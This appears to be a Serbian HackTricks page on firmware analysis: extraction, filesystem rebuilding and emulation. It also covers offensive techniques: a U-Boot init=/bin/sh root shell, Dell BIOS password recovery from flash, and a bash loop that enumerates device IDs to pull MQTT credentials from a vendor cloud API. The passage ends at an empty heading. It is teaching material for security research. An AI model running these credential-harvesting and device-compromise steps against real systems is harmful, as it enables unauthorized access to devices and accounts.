# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Uvod**

### Povezani resursi

Za preuzimanje firmvera preko izloženih hardverskih interfejsa pogledajte [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) i [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Za ponovljivo snimanje UART-a tokom pokretanja uređaja, pre pristupa konzoli, pogledajte [SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmver je ključni softver koji omogućava ispravan rad uređaja, upravljajući komunikacijom između hardverskih komponenti i softvera sa kojim korisnici stupaju u interakciju. Čuva se u trajnoj memoriji, što uređaju omogućava pristup važnim instrukcijama od trenutka uključivanja, nakon čega se pokreće operativni sistem. Analiza i eventualna izmena firmvera važan je korak u otkrivanju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je važan početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- Arhitekturi CPU-a i operativnom sistemu koji koristi
- Specifičnostima bootloader-a
- Hardverskom rasporedu i tehničkoj dokumentaciji
- Metrikama baze koda i lokacijama izvornog koda
- Spoljnim bibliotekama i vrstama licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i otkrivenim ranjivostima

U tu svrhu su alati za **open-source intelligence (OSINT)** neprocenjivi, kao i analiza svih dostupnih komponenti open-source softvera, putem ručnog i automatizovanog pregleda. Alati poput [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može koristiti za pronalaženje potencijalnih problema.

## **Pribavljanje firmvera**

Firmver se može nabaviti na više načina, od kojih svaki ima svoj nivo složenosti:

- **Direktno** od izvora (programera, proizvođača)
- **Izgradnjom** prema priloženim uputstvima
- **Preuzimanjem** sa zvaničnih stranica za podršku
- Korišćenjem upita **Google dork** za pronalaženje hostovanih datoteka firmvera
- Direktnim pristupom **cloud storage**-u pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **ažuriranja** pomoću man-in-the-middle tehnika
- **Ekstrakcijom** sa uređaja preko veza kao što su **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) ili **PICit**
- **Njuškanjem** komunikacije uređaja radi pronalaženja zahteva za ažuriranje
- Pronalaženjem i korišćenjem **hardkodiranih krajnjih tačaka za ažuriranje**
- **Preuzimanjem** iz bootloader-a ili preko mreže
- **Uklanjanjem i očitavanjem** memorijskog čipa, ako ništa drugo ne uspe, pomoću odgovarajućih hardverskih alata

### Samo UART logovi: prisilno pokretanje root shell-a preko U-Boot env-a u flash memoriji

Ako se UART RX ignoriše (dostupni su samo logovi), i dalje možete prisilno pokrenuti init shell tako što ćete van mreže **izmeniti U-Boot environment blob**:<sup>[[6]](#references)</sup>

1. Dump-ujte SPI flash pomoću SOIC-8 klipse i programatora (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Pronađite U-Boot env particiju, izmenite `bootargs` tako da sadrži `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo upišite samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno na ugrađenim uređajima kod kojih je shell bootloader-a onemogućen, ali se env particija može upisivati preko spoljnog pristupa flash memoriji.

### Otkrivanje zaštićenog koda pomoću Firewall zadatka za kopiranje

Neki MCU-ovi omogućavaju nezaštićenom aplikacionom kodu da pozove gateway za zaštićenu oblast, umesto da direktno čita zaštićeni Flash. Nakon što dobijete mogućnost izvršavanja aplikacionog koda, pregledajte svaki gateway zadatak kao zaseban primitiv za prenos memorije. U slučaju Cypherock X1, STM32L4 Firewall call gate prihvatao je zadatak, spoljašnji pokazivač `data`, dužinu i zaštićeni `address`. Zadatak za upis nije odbijao izvorni pokazivač `data` koji je pokazivao na Firewall Code. Pozivalac nije mogao direktno da čita taj kod, ali je sam gateway mogao da ga kopira u zaštićenu neisparljivu memoriju, koju je dozvoljeni zadatak za čitanje mogao da otkrije.<sup>[[15]](#references)</sup>

Da biste ponovili ovu vrstu otkrivanja, pronađite upisivu stranicu zaštićene memorije sa odgovarajućim zadatkom za čitanje, postavite izvor za upis na uzastopne adrese zaštićenog koda i pročitajte pripremljene bajtove. Pre ponavljanja upisa proverite medijum za skladištenje: u ovom slučaju to je bio Flash, pa je stranicu trebalo obrisati pre ponovne upotrebe. Istraživači su koristili rutinu koja je brisala i vraćala validan sadržaj Secure Data Storage-a, a zatim su pripremali kod u preostalom slobodnom prostoru umesto da prepišu podatke novčanika. Za ovo je potrebno izvršavanje koda na MCU-u i dostupan call gate; ovo nije direktno zaobilaženje zaštite čitanja sa neautentifikovanog hosta.<sup>[[15]](#references)</sup>

Oporavljeni kod može da otkrije [propuste u poverenju u ažuriranje firmvera i integritet pokretanja](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Analiza firmvera

Sada kada **imate firmver**, potrebno je da izdvojite informacije o njemu kako biste znali kako da postupite. Za to možete koristiti razne alate:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ako pomoću tih alata ne pronađete mnogo toga, proverite **entropiju** slike pomoću `binwalk -E <bin>`. Ako je entropija niska, verovatno nije šifrovana. Ako je visoka, verovatno je šifrovana (ili kompresovana na neki način).

Pored toga, pomoću ovih alata možete izdvojiti **datoteke ugrađene u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili upotrebite [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da biste pregledali datoteku.

### Neobrađeni grafički elementi za ekran u eksternoj flash memoriji

Eksterni SPI dump ne sadrži nužno izvršni firmware MCU-a. Kod Cortex-M ciljnog uređaja, uporedite početak svakog kandidatskog regiona koda sa memorijskom mapom uređaja: uobičajena vektorska tabela počinje verovatnom adresom steka u SRAM-u i adresom reset-handlera u izvršnoj memoriji. Odsustvo vektorske tabele na pomeraju nula samo po sebi ne dokazuje da ceo čip nema kôd; pregledajte i druge pomeraje i raspored pokretanja. Ako `binwalk` ne pronađe kontejner, pregledajte neobrađene bajtove i uporedite adrese čitanja flash memorije iz [dekodiranog SPI snimka](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) sa radnjama koje učitavaju nove ekrane.<sup>[[14]](#references)</sup>

Za region sa grafičkim elementima za ekran isprobajte različite formate piksela i dimenzije, umesto da pretpostavite da je u pitanju PNG/JPEG. Na navedenom uređaju korišćeni su frejmovi formata **80×160 RGB565 little-endian**: sa dva bajta po pikselu, jedan frejm zauzima **25.600 bajtova** (25 KiB), a ne 24 kilobita. Adresa čitanja flash memorije identifikovala je pomeraj grafičkog elementa ekrana; istraživač je konvertovao pripremljenu sliku pomoću `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, zamenio grafički element iste veličine u originalnom dump-u, upisao ga pomoću `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` i potvrdio da se nova slika prikazuje na ekranu. Ovo demonstrira upisive *eksterne grafičke elemente za ekran*, a ne izdvajanje ili ponovno flešovanje internog firmware-a MCU-a. Sačuvajte originalni dump i proverite dimenzije, redosled bajtova, pomeraj i dužinu zamene pre bilo kakvog upisa.<sup>[[14]](#references)</sup>

### Diferencijalna analiza flash memorije i povratno dostupna XOR skladišta tajni

Kada format skladištenja neke postavke firmware-a nije dokumentovan, prvo napravite nekoliko istovrsnih čitanja flash memorije, promenite **tačno jednu** postavku, ponovo dump-ujte ceo čip i uporedite pomeraje. Ponavljanje eksperimenta sa kontrolisanim vrednostima pomaže da razlikujete postavku od brojača i metapodataka upisa; promene na novim pomerajima, umesto na istom mestu, ukazuju na skladište koje podržava samo dodavanje ili je strukturirano kao dnevnik. Sačuvajte obrisane/stornirane unose jer njihovi bajtovi sadržaja možda i dalje mogu da se povrate.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nakon što pronađete region, izdvojite module firmvera pomoću alata kao što je `binwalk` i izvršite reverzni inženjering writer/validator koda u Ghidri. Potvrdite granice polja, dopunu, indeksiranje ključa i izvođenje ključa u kodu, umesto da šemu zaključujete samo na osnovu obrazaca u šifratu.<sup>[[12]](#references)</sup>

#### Oporavak ključeva iz šifrovane dopune nulama

Kao što je opisano u [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), poznati otvoreni tekst otkriva bajtove keystream-a na istim pomerajima. Polje fiksne veličine posebno je izloženo kada se njegova dopuna nulama prostire preko svih indeksa ponavljajućeg XOR ključa: šifrovana dopuna direktno otkriva te bajtove ključa, jer je `0x00 XOR key_byte = key_byte`. Ako su obuhvaćeni svi indeksi ključa, rekonstrušite ključ iz završnog dela šifrata i dešifrujte popunjene bajtove.<sup>[[12]](#references)</sup>

Dell-ov ranjivi format DVAR BIOS lozinke konkretan je primer: bajt `0` polja od 32 bajta je u otvorenom tekstu, dok se za bajtove `1..31` koristi ponavljajući ključ od 20 bajtova.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Za lozinku dužine `L`, pozicije `L..31` bile su nule pre XOR-a. Kada je `L <= 12`, te pozicije obuhvataju svaki indeks ključa, pa se ceo ključ i lozinka mogu oporaviti bez brute force-a:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Izvlačenje ključeva iz istorijskih zapisa

Nemojte analizirati svaki zapis zasebno. DVAR ključ se približno izvodi kao `modified_md5(device_seed || variable_GUID || password[0])`: seed uređaja i GUID su fiksni, a jedini unos koji zavisi od lozinke jeste njen prvi bajt u čistom tekstu. To daje najviše 256 ključeva po uređaju, pa zapisi koji počinju istim bajtom dele ključ. Grupisanje aktivnih i obrisanih zapisa prema tom bajtu omogućava da kratak istorijski zapis leak-uje ceo ključ kroz padding i dešifruje aktuelni, duži zapis čiji padding nije dovoljan. Zato rotacija lozinke može povećati izloženost ako se stari šifrat označi kao obrisan umesto da se izbriše.<sup>[[12]](#references)</sup>

Alat [`dellpwn`](https://github.com/R3n5k1/dellpwn) pronalazi DVAR, proverava kandidate za zapise, oporavlja lozinke i može da prikaže sirove bajtove koji su sačuvani ili korišćeni kao ključ. Izgradite ga iz checkout-a i skenirajte proverenu flash sliku na sledeći način:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Za prilagođene parsere odbacujte lažno pozitivne rezultate proverom strukture zapisa, ograničenja za štampive znakove, nultog dopunjavanja, entropije ključa i doslednosti na mestu gde se ključ ponavlja. Ako ponovljeni dumpovi pokazuju retke promene bitova pri svakom upisu, navedite uočene maske i rangirajte korekcije prema ovim ograničenjima, ali prijavite dvosmislene znakove umesto da heuristički rezultat predstavljate kao tačno izdvajanje.<sup>[[12]](#references)</sup>

Provere lozinki treba da čuvaju soljeni, iterirani jednosmerni hash umesto reverzibilnog šifrovanog teksta, a skladišta sa strukturom dnevnika treba bezbedno da uklone zastareli tajni materijal.<sup>[[12]](#references)</sup>

### Preuzimanje fajl sistema

Pomoću prethodno pomenutih alata, kao što je `binwalk -ev <bin>`, trebalo je da budete u mogućnosti da **izdvojite fajl sistem**.\
Binwalk ga obično izdvaja u **fasciklu nazvanu po tipu fajl sistema**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje fajl sistema

Ponekad binwalk **neće imati magic bajt fajl sistema u svojim potpisima**. U tim slučajevima, upotrebite binwalk da **pronađete pomeraj fajl sistema i izdvojite kompresovani fajl sistem** iz binarne datoteke, a zatim ga **ručno izdvojite** u skladu sa njegovim tipom, prateći korake u nastavku.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Pokrenite sledeću **dd komandu** za izdvajanje Squashfs sistema datoteka.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u gornjem primeru)

`$ unsquashfs dir.squashfs`

Datoteke će nakon toga biti u direktorijumu "`squashfs-root`".

- CPIO arhivske datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 sisteme datoteka

`$ jefferson rootfsfile.jffs2`

- Za ubifs sisteme datoteka sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Rekonstrukcija podeljenih ugrađenih root sistema datoteka

Ako raw eMMC/SSD dump sadrži ispravno zaglavlje sistema datoteka, ali se njegovi pomeraji metapodataka protežu izvan nominalne particije, nemojte ga odmah klasifikovati kao oštećen. Ugrađeni boot kod može da sastavi pravi root uređaj iz više fizičkih opsega pomoću Device Mapper-a, pa se izdvajanjem jedne GPT particije dobija samo prvi segment.<sup>[[9]](#references)</sup>

#### Početna analiza kompletne slike medija

Najpre proverite da li je pribavljanje završeno, da li je veličina stabilna i da li neki proces i dalje upisuje u sliku. Ako naziv datoteke sadrži početnu/završnu adresu, uporedite taj opseg sa stvarnim brojem bajtova. Obnovite GPT u režimu samo za čitanje i prikačite samo potreban opseg; **nemojte** pokretati `vgchange -ay` nad nepouzdanim fizičkim volumenom na radnoj stanici, jer su mogući sukobi grupa volumena i neželjeni upisi.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferirajte jednokratnu VM kada originalna init logika ili LVM stek moraju da vide celu sliku. Istorijski zapisi pokretanja sa standardne boot particije posebno su korisni: bootloader je možda zabeležio pomeraje proprietarnog kontejnera, dužine komponenti, izbor slota, pravila poravnanja i proveru potpisa. Koristite te vrednosti da izdvojite ugrađenu komandnu liniju/kernel/initramfs, a zatim nezavisno proverite svaki izlaz pomoću `file`, bajtova potpisa i `binwalk`; čitanje do kraja kontejnera može slučajno da doda initrd, ACPI objekat ili potpis kernelu.<sup>[[9]](#references)</sup>

#### Rekonstruišite mapu blokova pri pokretanju

Izdvojite kernelov initramfs i analizirajte njegov `/init` i sve biblioteke za skladištenje. U [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) pratite reference stringova za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i putanje particija; zatim pratite kod koji bira aktivni A/B slot i pravi tabelu. Korisne početne tačke za radare2 su `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

linear target mapira uzastopne opsege virtuelnog uređaja na opsege jednog ili više pozadinskih uređaja. Rekonstruisana tabela sa dva segmenta obično ima ovaj oblik (sve pozicije i dužine su u sektorima od 512 bajtova):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Tačno reprodukujte aritmetiku mašinskog koda, uključujući širinu celih brojeva, pomeranja i konverzije jedinica. Na primer, sledeći izraz zaokružuje veličinu u bajtovima naniže do granice od 4 KiB, pa je tek onda pretvara u sektore od 512 bajtova; ako ga zamenite izrazom `p4_bytes // 512`, izabrani završni deo biće pomeren za `p4_bytes % 4096` kad god particija nije poravnata na granicu stranice.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstruišite ravnu analitičku sliku kopiranjem opsega redosledom iz tabele, u ograničenim blokovima, umesto učitavanja celog dump-a medija u memoriju. Time se izbegava i kreiranje host-side mapper uređaja. Zadržite GPT izvedene ofsete, obrnute brojeve sektora i rezultujuću dužinu izlaza kao zasebne tvrdnje.<sup>[[9]](#references)</sup>

#### Razlikovanje oštećenja od greške u rekonstrukciji sa konstantnim pomakom

Za SquashFS proverite `hsqs` magic i dekodirajte little-endian 64-bitno polje `bytes_used` na ofsetu 40 u superbloku pre pokretanja `unsquashfs`. Ako izdvajanje ne uspe u nekoliko međusobno nepovezanih struktura, pretražite širok prozor oko očekivanih pozicija i zahtevajte jake strukturne kandidate: blok metapodataka koji može da se dekompresuje, nekoliko uzastopnih ispravnih unosa direktorijuma, uverljiva polja inode-a, root inode u skladu sa brojem inode-a ili ispravnu strukturu metapodataka integriteta. Jedno poklapanje magic vrednosti nije dovoljno.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Kada isti potpisani pomak učini nezavisne strukture ispravnim — na primer, metapodatke direktorijuma i verity zapis — verovatni uzrok je sistematska greška u početku segmenta, a ne nedostajući bajtovi. Vratite se na obrnutu aritmetiku i potražite odbačene ostatke pri deljenju, predznak, prekoračenje ili zaokruživanje na granicu sektora/stranice pre nego što pokušate oporavak napuštenih podataka ili izmenu metapodataka sistema datoteka.<sup>[[9]](#references)</sup>

Na kraju, držite granice zaštite odvojene: LUKS volumeni sa ključem zapečaćenim u TPM-u štite poverljivost podataka, dok potpisano dm-verity mapiranje štiti integritet osnovnog sistema datoteka. Softverski TPM ne može da povrati ključ zapečaćen za originalni fizički TPM, a pokretanje izmenjenog SquashFS-a pomoću init-a namenjenog samo istraživanju, koji izostavlja verifikaciju verity-ja, ne falsifikuje njegov potpis niti razbija dm-verity.<sup>[[9]](#references)</sup>

## Analiziranje firmware-a

Kada se firmware pribavi, neophodno je analizirati ga da bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj postupak podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz slike firmware-a.

### Alati za početnu analizu

Dodatne alate za analizu firmware-a i materijale za čitanje potražite u [odeljku za firmware u delu Alati i resursi trećih strana](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware).

U nastavku je naveden skup komandi za početni pregled binarne datoteke (u nastavku označene kao `<bin>`). Ove komande pomažu u prepoznavanju tipova datoteka, izdvajanju stringova, analizi binarnih podataka i razumevanju detalja o particijama i sistemu datoteka:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Da bi se procenilo stanje šifrovanja slike, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo šifrovanja, dok visoka entropija ukazuje na moguće šifrovanje ili kompresiju.

Za izdvajanje **ugrađenih datoteka** preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za pregled datoteka.

### Izdvajanje datotečnog sistema

Pomoću `binwalk -ev <bin>` obično se može izdvojiti datotečni sistem, često u direktorijum nazvan po tipu datotečnog sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip datotečnog sistema zbog nedostajućih magic bajtova, potrebno je ručno izdvajanje. To podrazumeva korišćenje `binwalk` za pronalaženje pomeraja datotečnog sistema, a zatim komande `dd` za izdvajanje datotečnog sistema:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Nakon toga se, u zavisnosti od tipa sistema datoteka (npr. squashfs, cpio, jffs2, ubifs), koriste različite komande za ručno izdvajanje sadržaja.

### Analiza sistema datoteka

Kada se sistem datoteka izdvoji, počinje potraga za bezbednosnim propustima. Pažnja se posvećuje nezaštićenim mrežnim daemon-ima, hardkodovanim akreditivima, API endpoint-ima, funkcijama update servera, nekompajliranom kodu, startup skriptama i kompajliranim binarnim fajlovima za offline analizu.

**Ključne lokacije** i **stavke** koje treba pregledati obuhvataju:

- **etc/shadow** i **etc/passwd** za korisničke akreditive
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione i skriptne fajlove koji mogu sadržati ranjivosti
- Ugrađene binarne fajlove za dalju analizu
- Uobičajene web servere i binarne fajlove IoT uređaja

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti u sistemu datoteka:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih fajlova

Izvorni kod i kompajlirani binarni fajlovi pronađeni u sistemu datoteka moraju se detaljno pregledati zbog ranjivosti. Alati kao što su **checksec.sh** za Unix binarne fajlove i **PESecurity** za Windows binarne fajlove pomažu u prepoznavanju nezaštićenih binarnih fajlova koji bi mogli biti iskorišćeni.

## Prikupljanje cloud konfiguracije i MQTT akreditiva pomoću tokena izvedenih iz URL-a

Mnogi IoT hub-ovi preuzimaju konfiguraciju za svaki uređaj sa cloud endpoint-a koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-a uređaja pomoću hardkodovanog tajnog ključa, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen je kao velika heksadecimalna slova

Ovaj dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, koja često otkriva MQTT akreditive u otvorenom tekstu i prefikse topic-a.

Praktičan postupak:

1) Izdvojite deviceId iz UART boot logova

- Povežite UART adapter od 3.3V (TX/RX/GND) i sačuvajte logove:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Potražite linije koje ispisuju URL obrazac cloud konfiguracije i adresu brokera, na primer:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Oporavite STATIC_KEY i algoritam tokena iz firmware-a

- Učitajte binarne datoteke u Ghidra/radare2 i potražite putanju konfiguracije ("/pf/") ili upotrebu MD5.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izračunajte token u Bash-u i pretvorite heš u velika slova:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Prikupite cloud konfiguraciju i MQTT akreditive

- Sastavite URL i preuzmite JSON pomoću curl-a; parsirajte ga pomoću jq-a da biste izdvojili tajne:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Zloupotreba MQTT-a bez enkripcije i slabih ACL-ova za teme (ako postoje)

- Koristite pronađene akreditive da biste se pretplatili na teme za održavanje i tražili osetljive događaje:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerišite predvidljive ID-jeve uređaja (u velikom obimu, uz ovlašćenje)

- Mnogi ekosistemi ugrađuju bajtove OUI-ja/proizvoda/tipa proizvođača, a zatim sekvencijalni sufiks.
- Možete iterirati kroz moguće ID-jeve, programatski izvoditi tokene i preuzimati konfiguracije:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Napomene
- Uvek pribavite izričito odobrenje pre pokušaja masovne enumeracije.
- Kada je moguće, prednost dajte emulaciji ili statičkoj analizi radi otkrivanja tajni bez menjanja ciljnog hardvera.


Emulacija firmvera omogućava **dinamičku analizu** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove zbog zavisnosti od hardvera ili arhitekture, ali prebacivanje root sistema datoteka ili određenih binarnih datoteka na uređaj sa odgovarajućom arhitekturom i redosledom bajtova, kao što je Raspberry Pi, ili na unapred pripremljenu virtuelnu mašinu, može olakšati dalja testiranja.

### Emulacija pojedinačnih binarnih datoteka

Pri ispitivanju pojedinačnih programa ključno je utvrditi redosled bajtova i CPU arhitekturu programa.

#### Primer sa MIPS arhitekturom

Za emulaciju binarne datoteke za MIPS arhitekturu može se koristiti komanda:

```bash
file ./squashfs-root/bin/busybox
```

I za instaliranje neophodnih alata za emulaciju:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Za MIPS (big-endian) koristi se `qemu-mips`, a za little-endian binarne datoteke koristi se `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke postupak je sličan, pri čemu se za emulaciju koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmware-a, automatizujući postupak i pomažući pri dinamičkoj analizi.

### Rekonstrukcija podeljenih i verifikovanih root sistema datoteka za emulaciju

Ako je SquashFS superblok čitljiv, ali su pomeraji inode-a, direktorijuma ili fragment-tabele nemogući, nemojte odmah menjati `unsquashfs`. Obrnutim inženjeringom analizirajte rani boot binarni fajl i reprodukujte graf blok uređaja koji on kreira: ugrađeni sistemi mogu da izlože nominalnu root particiju, ali da stvarni sistem datoteka formiraju pomoću `dm-linear` mapiranja koje dodaje sektore pozajmljene sa druge particije. Provere koje obuhvataju samo superblok mogu da uspeju čak i kada su svi naredni blokovi metapodataka pomereni.<sup>[[11]](#references)</sup>

Sačuvajte aritmetiku firmware-a tačno. Konkretno, utvrdite da li su dužine izražene u bajtovima, sektorima od 512 bajtova ili stranicama od 4 KiB; reprodukujte pomeranja i odsecanje istim redosledom kao u originalu; i uzmite u obzir završne oblasti koje zavise od banke u A/B rasporedima. Na primer, `(partition_bytes >> 12) << 3` najpre odseca na granicu od 4 KiB, a tek zatim izražava rezultat u sektorima od 512 bajtova; zamena sa `partition_bytes // 512` može da pomeri dodati opseg za nekoliko kilobajta i ošteti sve naredne SquashFS tabele.<sup>[[11]](#references)</sup>

Korisni koraci za proveru su:<sup>[[11]](#references)</sup>

1. Iz binarnog fajla verifier/init utvrdite izvorni uređaj, početni sektor i dužinu svakog `dm-linear` segmenta.
2. Spojite ili mapirajte opsege bez menjanja njihovih pravila poravnanja.
3. Ako izdvajanje i dalje ne uspe, pretražite samo mali opseg oko predviđene granice i zahtevajte nekoliko uzastopnih važećih struktura metapodataka, umesto da prihvatite samo uverljiv superblok.
4. Pokrenite neizmenjeni `unsquashfs` nad rekonstruisanom slikom; uspešan prolazak kroz sve direktorijume i fragmente pouzdaniji je dokaz od rezultata `unsquashfs -stat`.

#### Zamena dm-verity koju kontroliše analitičar

